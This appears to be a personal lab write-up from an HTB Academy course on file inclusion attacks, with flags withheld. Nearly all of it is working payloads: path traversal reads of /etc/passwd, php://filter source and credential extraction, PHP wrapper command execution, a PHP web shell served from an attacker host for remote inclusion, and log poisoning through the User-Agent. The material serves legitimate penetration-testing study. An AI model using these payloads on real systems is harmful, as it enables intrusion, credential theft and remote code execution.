# 20 — File Inclusion

> **Path Phase:** Web Attacks | **Difficulty:** Medium | **Sections:** 11

Exploiting LFI/RFI to read files and achieve RCE — bypasses, PHP wrappers, log poisoning.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Intro to File Inclusions
2. Local File Inclusion (LFI)
3. Basic Bypasses
4. PHP Filters
5. PHP Wrappers
6. Remote File Inclusion (RFI)
7. LFI and File Uploads
8. Log Poisoning
9. Automated Scanning
10. File Inclusion Prevention
11. Skills Assessment

---

## 1–2 — Local File Inclusion  
http://{TARGET}/index.php?page=/etc/passwd
http://{TARGET}/index.php?page=../../../../etc/passwd  
Windows:

http://{TARGET}/index.php?page=......\windows\system32\drivers\etc\hosts

> **LFI read:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 3 — Basic Bypasses

....//....//etc/passwd
%2e%2e%2fetc%2fpasswd
../../../etc/passwd%00 (PHP < 5.3.4)
/var/www/html/../../../etc/passwd


## 4 — PHP Filters (read source)

http://{TARGET}/index.php?page=php://filter/convert.base64-encode/resource=config.php

Decode base64 → read PHP source (creds inside)
> **Source-code creds:** ✅ Completed in lab (withheld per HTB Academy policy)

## 5 — PHP Wrappers (RCE)
data:// wrapper (base64 of <?php system($_GET['c']);?>):

http://{TARGET}/index.php?page=data://text/plain;base64,<b64>&c=id

expect:// wrapper:

http://{TARGET}/index.php?page=expect://id

php://input (POST body as PHP):

POST /index.php?page=php://input → body: <?php system('id'); ?>


## 6 — Remote File Inclusion (RFI)
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 80
# Include remotely:
http://{TARGET}/index.php?page=http://<YOUR_IP>/shell.php&c=id
```
> **RFI RCE:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 7 — LFI + File Uploads (RCE)
Upload image with embedded PHP, then include:

http://{TARGET}/index.php?page=./uploads/shell.gif&c=id
http://{TARGET}/index.php?page=zip://uploads/shell.zip%23shell.php&c=id


## 8 — Log Poisoning (RCE)
```bash
curl -A "<?php system(\$_GET['c']); ?>" http://{TARGET}/
http://{TARGET}/index.php?page=/var/log/apache2/access.log&c=id
# Also SSH auth.log, mail log, etc.
```
> **Log poisoning:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 9 — Automated Scanning
```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://{TARGET}/index.php?page=FUZZ" -fs <size>
```

## 10 — Prevention
Whitelist allowed files, disable `allow_url_include`, sanitize input, avoid user input in include paths.

## 11 — Skills Assessment

?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index
curl -A "<?php system(\$_GET['c']);?>" http://{TARGET}/
?page=/var/log/apache2/access.log&c=cat /flag.txt

> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Technique | Method |
|-----------|--------|
| LFI read | Path traversal, php://filter |
| RCE | data://, php://input, RFI, log poisoning, upload+include |
| Automation | `ffuf` with LFI wordlists |

## 🔑 Key Takeaways
- `php://filter/convert.base64-encode` reads PHP **source** (find creds).
- Multiple RCE paths: wrappers, RFI, log poisoning, upload+include.
- Log poisoning via User-Agent is a classic exam technique.
- Always try `/etc/passwd` first to confirm the LFI.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
